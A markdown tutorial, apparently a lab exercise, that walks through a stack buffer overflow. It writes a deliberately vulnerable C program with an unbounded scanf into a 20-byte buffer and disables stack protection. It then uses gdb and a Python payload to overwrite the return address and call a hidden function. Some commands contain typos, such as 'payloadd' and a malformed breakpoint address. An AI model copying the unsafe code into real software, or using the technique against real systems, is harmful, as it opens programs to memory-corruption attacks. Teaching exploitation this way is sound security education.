# Exploiting a vulnerable C file using buffer overflow.

1. Firstly, create two files. One named vuln.c (The vulnerable C file) and payload (a short program which will aid us in exploiting the vulnerable C file).
```
    touch payload
    touch vuln.c
```

2. Next, we type in a few codes inside the C file using the 'sudo nano' command.
```
    sudo nano vuln.c
```
  C code:  
```
    #include <stdio.h>

    void secretFunction(){
	    printf("You have entered a restricted area\n");
	    printf("Pwned!\n");
    }

    void echo(){
	    char buffer[20];
	    printf("Enter some texts :\n");
	    scanf("%s", buffer);
	    printf("You entered %s\n", buffer);
    }

    int main(){
	    echo();
	    return 0;
    }
```
3. Exit and save the file using "Control + X". Then, we run the command to see if our C file is working using the './' command.
```
    gcc -o vuln -fno-stack-protector -m32 vuln.c
    ./vuln
```

4. After having no problems with running our program, we should be able to debug it by using the 'gdb' command, which will bring us into the debugging mode. Once in the debugging mode, we should start by disassembling the echo file. After that, look for the memory that has 'scanf'. Break the memory before and after it using the "break *(the desired memory, which looks like 0x03239827)
```
    gdb vuln
    (gdb) disassemble echo
    (gdb) break *0x080484c9
    (gdb) break *0x08048d5
```
 Which will look something like this:
 Disassemble echo:
 ![Imgur](https://i.imgur.com/8digEtD.png)
 Break:
![Imgur](https://i.imgur.com/l3XmQ2g.png)

 
5. After that, we should run the program in debugging mode to test out the breaking points and also do some tweaking to figure out where the return address by inserting any variable which is easy for us to spot after the change is made, which in this case is A, represented by 41.

```
    (gdb) run
    (gdb) x/20x $esp
    (gdb) c
    (gdb) AAAAAAAA
    (gdb) x/20x $esp 
```
Output:
![Imgur](https://i.imgur.com/pDElRDo.png)

Exit the debugging mode once finished.

6. Next, we need to input some test code into the payload to use before actually deploying a real code. (Optional)
```
    python -c 'print "A"*28 + "B"*4' > payload
```
 
7. Enter the debugging mode again using 'fg'. This time, we are going to run the C file again, but instead of having to manually enter 'A' 8 times, we let the payload do it for us with the codes that we have set.
```
    (dbg) run < payload
    (dbg) x/20x $esp
    (dbg) c
    (dbg) x/20x $esp
```
Output:
![Imgur](https://i.imgur.com/jfoONjG.png)

8. Next, we disassemble the 'secretFunction' in order to get the memory which we are going to use in the real payload file. This will help us tell the C file to run the 'secretFunction' function that we previously don't have access to. Take note of the first line of memory because that is what we need to call it.
```
(dbg) disassemble secretFunction
```
![Imgur](https://i.imgur.com/VXpw4pW.png)
9. After we copy the memory address, exit the debugging mode again. This time we code the payload file to tell the C file to run the 'secretFunction'. In order to do that, we must first print 32 'A' followed by the memory address from the first line of 'secretFuntion'. Use '\x' for every 2 bit of the memory address. Then, we test the software out and it should give us 32 'A' and two diamonds.
```
    python -c 'print "A"*32 + "\x90\x84\x04\x08"' > payload
    cat payloadd
```

10. Finally, we go back to the debugging mode. We run the file with payload again and it should give us the 'secretFunction'. Once all that is done, exit the debugging mode again and run the file outside of the debugging mode. 
```
    (dbg) run < payload
    (dbg) x/20x $esp
    (dbg) c
    (dbg) x/20x $esp
    (dbg) c
    (dbg) ^Z
    ./vuln < payload
```
Output:
![Imgur](https://i.imgur.com/UAwSDrV.png)
    
